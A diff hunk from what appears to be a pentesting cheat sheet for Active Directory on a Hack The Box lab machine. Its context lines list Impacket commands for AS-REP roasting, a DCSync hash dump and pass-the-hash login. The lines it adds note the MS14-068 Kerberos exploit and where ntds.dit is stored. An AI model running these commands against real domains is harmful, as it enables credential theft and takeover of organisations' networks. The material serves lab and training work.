@@ -62,7 +62,8 @@ windapsearch.py -d [DOMAIN] --dc-ip [IP_ADDR] -U    # -U to enumerate all AD use
 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request 		# ASRep Rosting
 secretdumps.py htb.local/svc_user@10.10.10.161 -just-dc 	# dcsync attack, dump hashes
 psexec.py htb.local/administrator@10.10.10.161 -hashes [ntlm:hash]	# login with hashes
-
+----------Info----------
+MS14-068 (For DC older than Windows Server 2012 R2)		# Ref: https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html
 Database of AD stored on C:\Windows\NTNDS\ntds.dit of DC
 ```
 Ref: https://book.hacktricks.xyz/pentesting/pentesting-ldap
